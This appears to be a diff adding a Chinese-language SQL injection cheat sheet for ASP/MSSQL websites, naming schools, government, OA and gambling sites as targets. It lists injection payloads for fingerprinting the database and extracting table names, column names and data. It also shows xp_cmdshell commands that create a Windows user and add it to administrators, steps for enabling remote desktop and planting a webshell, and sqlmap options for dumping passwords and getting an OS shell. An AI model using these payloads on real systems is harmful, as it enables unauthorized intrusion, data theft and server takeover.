@@ -1,0 +1,76 @@
+sql*server注入漏洞（现在比较少了）
+	目标站类型  :  学校，政府，OA，游戏，棋牌，人事考试
+	语言类型：asp +sqlserver
+	抓鸡工具：hydra
+	sa权限：数据库操作，文件管理，命令执行，注册表读取system
+	db权限：文件管理
+
+调用数据库代码 : 
+	<%
+	set conn = server.createobject("adobe.conection")
+	%>
+
+注入语句：
+	1判断是否有注入: and 1=1可以运行但是and 1=2 不能正常显示
+	2初步判断是否为mssql数据库	：  and user > 0
+	3判断数据库系统
+		and （select count(*) from sysobjects）>0  mssql
+		and （select count(*) from msysobjects）>0  access
+	4 注入参数是字符
+		'and [查询条件] and " = '
+	5搜索时没过滤参数的
+		'and [查询条件] and '%25'= '
+	6猜表名
+		and (select count(*) from [tableName])>0
+	7猜字段
+		and (select count(column) from [tableName])>0
+	8猜字短中记录长短
+		and (select top 1 len(column) from [tableName])>0
+	9猜字段的ascii（acess）
+		and (select top 1 asc(mid(column,1,1)) from [tableName])>0
+	猜字段的ascii（mssql）
+		and (select top 1 unicode(substring(column,1,1)) from [tableName])>0
+	10测试权限结构（mssql）
+		and 1 =（select IS_SRVROLEMEMBER('sysadmin')）判断是否为系统管理员
+		如果是可以针对其管理员的权限取执行cmd命令（OA）
+		前提扩展插件：xp_cmdshell 扩展是否存在（此数据库是否支持cmdshell）如果没有需要百度安装
+		创建用户：;exec master..xp_cmdshell 'net user test test /add'
+		提权：;exec master..xp_cmdshell'net localgroup administrators test /add'
+		远程登录：win+r -->mstsc  远程登录失败后可能时3389端口没有开启，不允许登录
+		百度通过cmdshell打开3389端口的sql语句
+		最后登录
+		利用sp_makewebtask写一句话木马到根目录中的asp文件中
+		（DBO权限）
+		1判断是否为dbo权限
+			and 1 =（select ）is_member('db_owner'))
+		2搜索web目录
+			;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int not null IDENTITY(1,1))	
+		------------------->工具：Getwebshell	
+
+	12查看db版本（通过报错可以知晓表名）
+		and 1=(select @@version)
+	13猜表明
+		and 1=(select top 1 name from sysobjects where xtype='u' and name<>'newss')
+		and 1=(select name from master..sysdatabases for xml path)
+	14获取列名
+		and 1 =(select top 1name from sysobjects where xtype='u' and name <>'threads' and name<>'users' )
+	15工具使用
+		穿山甲：Pangolin
+		可以创建用户，可以一句话插入一个创建的文件中，用菜刀连接
+		sqlmap：
+		1寻找注入点：
+		cmd：sqlmap.py -u "injection url"
+		2查看是哪种权限账户
+		cmd：sqlmap.py -u "injection url" --is-dba
+		3查看当前用户名称
+		cmd：sqlmap.py -u "injection url" --current-user
+		4查看权限
+		cmd：sqlmap.py -u "injection url" --privileges
+		5查看密码
+		cmd：sqlmap.py -u "injection url" --password
+		6查看系统命令
+		cmd：sqlmap.py -u "injection url" --os-shell
+		6查看所有数据库
+		cmd：sqlmap.py -u "injection url" --dbs
+		7添加一句话到文件中
+		cmd：sqlmap.py -u "injection url"  echo<>
